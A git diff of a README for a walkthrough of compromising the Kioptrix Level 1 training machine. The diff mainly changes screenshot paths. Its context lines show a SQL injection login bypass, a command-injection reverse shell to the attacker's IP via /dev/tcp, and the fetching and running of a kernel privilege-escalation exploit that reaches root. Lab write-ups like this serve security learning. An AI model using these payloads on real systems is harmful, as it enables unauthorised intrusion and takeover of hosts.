@@ -21,8 +21,7 @@ A full walkthrough of compromising the **Kioptrix Level 1** vulnerable machine (
 
 Used ARP-based scanning (netdiscover) to locate live hosts on the local subnet and identify the target at `192.168.1.99`.
 
-<!-- IMAGE PLACEHOLDER 1 -> drop screenshot here: netdiscover/ARP scan showing hosts 192.168.1.98 and 192.168.1.99 -->
-![Host discovery with netdiscover](images/01-host-discovery.png)
+![Host discovery with netdiscover](01-host-discovery.png)
 
 ---
 
@@ -47,8 +46,7 @@ Key findings:
 
 **OS detection:** Linux kernel 2.6.9 – 2.6.30 (CentOS). These outdated services immediately stand out as likely vulnerable.
 
-<!-- IMAGE PLACEHOLDER 2 -> drop screenshot here: nmap -sV -O output showing open ports and OS -->
-![Nmap service and OS scan](images/02-nmap-scan.png)
+![Nmap service and OS scan](02-nmap-scan.png)
 
 ---
 
@@ -60,8 +58,7 @@ The web server exposed a **Remote System Administration Login** page. The login 
 admin' or 1=1 #
 ```
 
-<!-- IMAGE PLACEHOLDER 3 -> drop screenshot here: login form with SQLi payload admin' or 1=1 # -->
-![SQL injection login bypass](images/03-sql-injection.png)
+![SQL injection login bypass](03-sql-injection.png)
 
 This granted access to a **Basic Administrative Web Console**. Its "Ping a Machine on the Network" feature was vulnerable to **command injection**, which I abused to spawn a reverse shell back to my attacker machine:
 
@@ -69,8 +66,7 @@ This granted access to a **Basic Administrative Web Console**. Its "Ping a Machi
 | sh -i >& /dev/tcp/192.168.1.64/4444 0>&1
 ```
 
-<!-- IMAGE PLACEHOLDER 4 -> drop screenshot here: admin web console with command-injection reverse shell payload -->
-![Command injection reverse shell](images/04-command-injection.png)
+![Command injection reverse shell](04-command-injection.png)
 
 A netcat listener on the attacker machine (`nc -lvnp 4444`) caught the connection, providing a low-privilege shell on the target.
 
@@ -86,8 +82,7 @@ I located the matching exploit with searchsploit:
 searchsploit -m linux/local/9545.c   # CVE-2009-2692 / EDB-9545
 ```
 
-<!-- IMAGE PLACEHOLDER 5 -> drop screenshot here: searchsploit output showing CVE-2009-2692 / EDB-9545 -->
-![searchsploit locating the kernel exploit](images/05-searchsploit.png)
+![searchsploit locating the kernel exploit](05-searchsploit.png)
 
 I served the exploit from the attacker box over HTTP and transferred, compiled, and executed it on the target:
 
@@ -104,8 +99,7 @@ chmod +x exploit
 whoami   # => root
 ```
 
-<!-- IMAGE PLACEHOLDER 6 -> drop screenshot here: wget + gcc + ./exploit + whoami showing root -->
-![Privilege escalation to root](images/06-privesc-root.png)
+![Privilege escalation to root](06-privesc-root.png)
 
 The exploit succeeded, escalating from a limited web shell to **root** — full compromise of the host.
 
